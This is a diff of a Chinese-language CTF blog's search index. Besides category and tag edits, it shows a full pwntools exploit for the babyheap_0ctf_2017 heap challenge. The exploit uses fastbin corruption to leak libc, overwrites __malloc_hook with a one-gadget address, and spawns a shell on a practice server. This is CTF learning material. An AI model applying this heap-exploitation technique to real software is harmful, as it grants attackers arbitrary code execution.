@@ -291,6 +291,9 @@
 <li><code>%</code>: 通配符表示匹配任意字符串，并将匹配到的字符串作为变量使用</li>
 </ul>
 <h2 id="functions"><a href="#functions" class="headerlink" title="functions"></a>functions</h2>]]></content>
+      <categories>
+        <category>杂记</category>
+      </categories>
       <tags>
         <tag>linux</tag>
       </tags>
@@ -466,11 +469,8 @@
 <h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;babyheap_0ctf_2017&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29856</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allo</span>(<span class="params">size</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">idx</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line">allo(<span class="number">0x80</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p8(<span class="number">0x80</span>) <span class="comment"># 使2的chunk空闲块指向了4号块的位置,4号位为较大的chunk，用来获取目标地址</span></span><br><span class="line">fill(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload) <span class="comment"># 让4号块的大小变成0x21，这样4号块就意义上被free了</span></span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#1 The original position of 2 # 申请原本2号块</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#2 4 Simultaneous pointing	# 这里就会申请到4号块的位置</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload) <span class="comment"># 将4号块的大小改回 0x91,不然找不到top chunk位置</span></span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x80</span>) <span class="comment"># 在申请一块大空间，避免4号块和top chunk合并</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)    <span class="comment"># 释放4号块</span></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">__malloc_hook = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>)) - <span class="number">88</span> - <span class="number">0x10</span></span><br><span class="line">libc_base = __malloc_hook - libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">log.info(<span class="string">&quot;__malloc_hook: &quot;</span>+ <span class="built_in">hex</span>(__malloc_hook))</span><br><span class="line">log.info(<span class="string">&quot;libc_base: &quot;</span>+ <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>) <span class="comment"># 相当于做一个切割，将0x80的块分成0x60在fastbin中，0x20在unsortedbin中</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(__malloc_hook - <span class="number">35</span>)</span><br><span class="line">fill(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line">allo(<span class="number">0x60</span>) <span class="comment"># 这个就会申请到假chunk</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x8</span>+<span class="number">0x2</span>+<span class="number">0x8</span>+<span class="number">1</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x4526a</span>)</span><br><span class="line">fill(<span class="number">6</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">79</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>pwn</category>
+        <category>刷题</category>
       </categories>
-      <tags>
-        <tag>刷题</tag>
-      </tags>
   </entry>
   <entry>
     <title>pwn栈刷题记录</title>
@@ -625,11 +625,6 @@
       <tags>
         <tag>刷题</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>内核学习</title>
-    <url>/2023/03/14/%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>堆学习</title>
@@ -793,7 +788,7 @@
 <h3 id="多线程支持"><a href="#多线程支持" class="headerlink" title="多线程支持"></a>多线程支持</h3><p>在原有的dlmalloc实现中，当两个线程要申请内存时，只有一个线程可以进入临界区申请内存，而另外的一个线程则必须等待知道临界区不再有线程。这是因为所有线程共享一个堆。在glibc的ptmalloc实现中，比较好的一点就是支持了多线程的快速访问。在新的实现中，所有的线程共享多个堆。</p>
 ]]></content>
       <categories>
-        <category>学习笔记</category>
+        <category>pwn总结</category>
       </categories>
       <tags>
         <tag>pwn</tag>
@@ -919,11 +914,16 @@
 
 ]]></content>
       <categories>
-        <category>学习笔记</category>
+        <category>pwn总结</category>
       </categories>
       <tags>
         <tag>pwn</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>深入浅出数据结构</title>
+    <url>/2023/05/05/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>汇编语言简单摘要</title>
